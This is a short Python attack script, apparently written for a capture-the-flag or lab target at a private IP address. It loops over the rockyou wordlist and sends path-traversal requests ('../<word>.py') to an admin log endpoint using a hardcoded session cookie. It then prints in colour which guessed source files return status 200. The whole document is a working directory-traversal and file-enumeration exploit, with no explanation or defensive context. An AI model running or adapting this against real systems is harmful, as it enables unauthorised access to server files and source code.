import requests
from colorama import Fore

wordlist = open("/usr/share/wordlists/rockyou.txt", "r")
endpoint = "http://10.10.11.88:8000/admin/get_system_log?log_identifier="
headers = {
	"cookie": "session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRB1ZQ.AhUbOvPKPeQlAUUAt5uf_LwAc3s",
}
for word in wordlist:
	response = requests.get(f"{endpoint}../{word.replace("\n", "")}.py", headers=headers)
	if str(200) in str(response.status_code):
		print(Fore.GREEN + f"{endpoint}../{word.replace("\n", "")}.py    [{response.status_code}]" + Fore.RESET)
	else:
		print(Fore.RED + f"{endpoint}../{word.replace("\n", "")}.py    [{response.status_code}]" + Fore.RESET)